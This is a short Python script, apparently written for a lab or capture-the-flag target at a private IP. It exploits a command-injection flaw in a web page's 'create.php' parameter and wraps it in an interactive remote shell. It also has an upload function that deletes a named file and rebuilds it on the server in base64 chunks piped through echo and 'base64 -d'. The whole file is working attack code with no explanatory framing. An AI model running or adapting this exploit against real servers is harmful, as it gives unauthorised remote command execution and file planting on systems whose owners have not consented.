import requests
from urllib.parse import quote
import base64
from tqdm import tqdm

host = '10.10.100.200'
port = 52054


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


url = f'http://{host}:{port}/create.php?s=;&c='
headers = {'User-Agent': 'Req Trick Agent v1.0'}
prompt = bcolors.FAIL + '$ ' + bcolors.ENDC


def exec(cmd):
    cur = url + quote(cmd)
    r = requests.get(cur, headers=headers)
    outp = r.text
    if outp and not outp.endswith('\n'):
        outp += '\n'
    return outp


def upload(file, batch=5000):
    with open(file, 'r') as fp:
        data = fp.read().replace('\r', '').encode()
    exec(f'rm -f {file}')
    for idx in tqdm(range(0, len(data), batch)):
        chunk = data[idx:idx + batch]
        chunk = base64.b64encode(chunk).decode()
        cmd = f'echo "{chunk}" | base64 -d >> {file}'
        exec(cmd)
    return 'DONE\n'


while True:
    cmd = input(prompt)
    if cmd.startswith('upload '):
        outp = upload(cmd[7:])
    else:
        outp = exec(cmd)
    print(outp, end='')
